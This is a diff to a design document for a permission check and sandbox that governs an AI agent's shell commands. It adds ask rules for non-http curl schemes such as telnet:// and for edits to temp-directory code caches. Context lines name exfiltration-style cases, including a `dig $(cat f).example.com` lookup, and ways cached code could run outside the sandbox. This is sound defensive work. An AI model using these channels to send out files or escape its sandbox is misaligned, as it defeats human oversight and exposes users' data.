@@ -89,7 +89,9 @@ For each shell tool call:
      such a command (`echo git init`) is not read as one.
      `curl` and `wget` pass only with options whose whole effect the check computes: a
      method other than GET or HEAD, `--url @file`, and options such as `-x`, `-nH`, `-r`
-     and `--proto-redir` ask; a file `curl` reads through a `file:` URL is held to the
+     and `--proto-redir` ask, and so does a `curl` URL of any scheme but http and https
+     (`telnet://` sends standard input; a host such as `ftp.x` picks a scheme too); a file
+     `curl` reads through a `file:` URL is held to the
      checks of a file read; a host or a query built at run time for a lookup tool
      (`dig $(cat f).example.com`) goes to the model.
    - **allow**: read-only commands, builds, tests, local git, edits inside the project
@@ -323,7 +325,7 @@ For each shell tool call:
      The code caches in the temp directories (`node-compile-cache`, which tsc turns on
      itself, `tsx-<uid>`, `jiti`, `v8-compile-cache-<uid>` and Jest's `jest_<uid>`, and a
      `NODE_COMPILE_CACHE` in a writable place) are private and empty for each call, so nothing
-     a call writes there runs in a later node outside the sandbox. Other tools' caches in the
+     a call writes there runs in a later node outside the sandbox; an edit there asks. Other tools' caches in the
      temp directories are not covered (see Known gaps).
      Everything else is mounted read-only as well, so `chmod`, `touch -d` and `setxattr` fail
      there too. Terminals (`/dev/tty`, `/dev/ptmx`, `/dev/pts`) are not writable and no device
